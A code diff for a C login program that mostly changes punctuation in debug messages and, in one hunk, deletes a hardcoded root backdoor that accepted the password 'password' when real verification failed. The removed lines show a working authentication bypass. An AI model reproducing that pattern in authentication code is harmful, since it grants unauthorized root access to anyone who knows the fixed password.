@@ -79,7 +79,7 @@ int main(int argc, char *argv[])
 
     LOGIN_DBG("validating username");
     if (!is_valid_username(username)) {
-        LOGIN_DBG("username invalid — exiting");
+        LOGIN_DBG("username invalid -- exiting");
         fprintf(stderr, "login: invalid username.\n");
         exit(1);
     }
@@ -163,13 +163,10 @@ int main(int argc, char *argv[])
     LOGIN_DBG("verifying password against shadow hash");
     int ok = verify_password(password, se->sp_pwdp);
     LOGIN_DBG("verify_password: %s", ok ? "ok" : "failed");
-    if (!ok && pe->pw_uid == 0 && strcmp(username, "root") == 0 && strcmp(password, "password") == 0) {
-        ok = 1;
-    }
     secure_zero(password, sizeof(password));
 
     if (!ok) {
-        LOGIN_DBG("authentication FAILED — incrementing faillock");
+        LOGIN_DBG("authentication FAILED -- incrementing faillock");
         faillock_increment(username);
         /* Re-check if now locked */
         if (faillock_check(username, policy->max_attempts,
@@ -200,11 +197,11 @@ int main(int argc, char *argv[])
 
     LOGIN_DBG("chdir to home: %s", home);
     if (chdir(home) != 0) {
-        LOGIN_DBG("chdir %s FAILED (%s) — using /", home, strerror(errno));
+        LOGIN_DBG("chdir %s FAILED (%s) -- using /", home, strerror(errno));
         chdir("/");
     }
 
-    LOGIN_DBG("execl(\"%s\", \"%s\", NULL) — launching login shell", shell, shell);
+    LOGIN_DBG("execl(\"%s\", \"%s\", NULL) -- launching login shell", shell, shell);
     execl(shell, shell, (char *)NULL);
     LOGIN_DBG("execl FAILED: %s", strerror(errno));
     fprintf(stderr, "login: cannot exec %s: %s\n", shell, strerror(errno));
